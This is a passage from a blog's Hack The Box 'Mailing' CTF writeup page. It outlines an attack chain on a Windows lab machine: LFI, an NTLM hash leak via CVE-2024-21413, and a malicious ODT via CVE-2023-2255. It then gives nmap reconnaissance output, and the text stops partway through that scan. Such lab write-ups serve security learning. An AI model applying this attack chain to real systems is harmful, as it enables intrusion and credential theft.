@@ -1,0 +1,2021 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=18d79529ed1a410777646c1aaed0e478c964ecf8">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Mailing writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="HTB Mailing writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Mailing is an easy Windows machine that teaches the following things. First, its needed to abuse a LFI to see hMailServer configuration and have a password. Then, that creds can be used to send an email to a user with a CVE-2024-21413 payload, which consists in a smb link that leaks his ntlm hash in a attacker-hosted smb server in case its opened with outlook. This hash can be cracked and consequently used to gain access to the machine. Finally, to gain access as Administrator, I will create a malicious odt file with a CVE-2023-2255 exploit which is opened by the Administrator." />
+<meta property="og:description" content="Mailing is an easy Windows machine that teaches the following things. First, its needed to abuse a LFI to see hMailServer configuration and have a password. Then, that creds can be used to send an email to a user with a CVE-2024-21413 payload, which consists in a smb link that leaks his ntlm hash in a attacker-hosted smb server in case its opened with outlook. This hash can be cracked and consequently used to gain access to the machine. Finally, to gain access as Administrator, I will create a malicious odt file with a CVE-2023-2255 exploit which is opened by the Administrator." />
+<link rel="canonical" href="http://localhost:4000/writeups/HTB/Mailing.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/HTB/Mailing.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-09-07T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Mailing writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-09-07T00:00:00+02:00","datePublished":"2024-09-07T00:00:00+02:00","description":"Mailing is an easy Windows machine that teaches the following things. First, its needed to abuse a LFI to see hMailServer configuration and have a password. Then, that creds can be used to send an email to a user with a CVE-2024-21413 payload, which consists in a smb link that leaks his ntlm hash in a attacker-hosted smb server in case its opened with outlook. This hash can be cracked and consequently used to gain access to the machine. Finally, to gain access as Administrator, I will create a malicious odt file with a CVE-2023-2255 exploit which is opened by the Administrator.","headline":"HTB Mailing writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/HTB/Mailing.html"},"url":"http://localhost:4000/writeups/HTB/Mailing.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href = "/writeups">Writeups</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/blog">Blog</a>
+    
+    
+</small>
+
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Blurry.html"> HTB Blurry writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;clearml/&gt; &lt;machine-learning/&gt; &lt;CVE-2024-24590/&gt; &lt;pickle/&gt; &lt;deserialization/&gt; &lt;python-torch/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Freelancer.html"> HTB Freelancer writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forgot-password/&gt; &lt;idor/&gt; &lt;qrcode/&gt; &lt;mssql/&gt; &lt;xp_cmdshell/&gt; &lt;sql-configuration/&gt; &lt;crash-dump-analysis/&gt; &lt;active-directory-acls/&gt; &lt;genericwrite/&gt; &lt;nt-hashes/&gt; &lt;secretsdump/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Boardlight.html"> HTB Boardlight writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Solarlab.html"> HTB Solarlab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Intuition.html"> HTB Intuition writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Mailing.html"> HTB Mailing writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Skyfall.html"> HTB Skyfall writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Runner.html"> HTB Runner writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/FormulaX.html"> HTB FormulaX writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Usage.html"> HTB Usage writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/IClean.html"> HTB IClean writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Headless.html"> HTB Headless writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Corporate.html"> HTB Corporate writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Perfection.html"> HTB Perfection writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB Mailing writeup</span> <span class="points"> [20 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+
+<p>Mailing is an easy Windows machine that teaches the following things. First, its needed to abuse a LFI to see hMailServer configuration and have a password. Then, that creds can be used to send an email to a user with a CVE-2024-21413 payload, which consists in a smb link that leaks his ntlm hash in a attacker-hosted smb server in case its opened with outlook. This hash can be cracked and consequently used to gain access to the machine. Finally, to gain access as Administrator, I will create a malicious odt file with a CVE-2023-2255 exploit which is opened by the Administrator.</p>
+    
+      <h1 id="port-recognaissance">
+        
+        
+          Port recognaissance <a href="#port-recognaissance" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-python">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.15
+# Nmap 7.94SVN scan initiated Mon Sep  2 12:22:57 2024 as: nmap -sS -p- --open -sVC --min-rate 5000 -v -n -Pn -oN mailing 10.10.11.14
+Nmap scan report for 10.10.11.14
+Host is up (0.34s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Did not follow redirect to http://mailing.htb
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+110/tcp   open  pop3          hMailServer pop3d
+|_pop3-capabilities: USER TOP UIDL
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp   open  imap          hMailServer imapd
+|_imap-capabilities: RIGHTS=texkA0001 IDLE CAPABILITY ACL QUOTA OK completed IMAP4rev1 SORT CHILDREN NAMESPACE IMAP4
+445/tcp   open  microsoft-ds?
+465/tcp   open  ssl/smtp      hMailServer smtpd
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|_ssl-date: TLS randomness does not represent time
+587/tcp   open  smtp          hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+993/tcp   open  ssl/imap      hMailServer imapd
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+|_ssl-date: TLS randomness does not represent time
+5040/tcp  open  unknown
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
